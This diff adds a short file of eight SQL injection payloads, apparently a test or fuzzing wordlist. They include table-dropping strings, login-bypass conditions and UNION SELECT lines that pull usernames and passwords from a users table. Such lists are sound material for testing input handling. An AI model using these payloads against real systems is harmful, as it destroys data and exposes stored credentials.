@@ -1,0 +1,8 @@
+'; DROP TABLE users--
+'; SELECT * FROM users--
+1; DROP TABLE users--
+' OR 1=1--
+" OR ""="
+test' UNION SELECT 1, username, password FROM users--
+test' OR '1'='1'--
+test' AND 1=0 UNION ALL SELECT NULL, username, password FROM users--
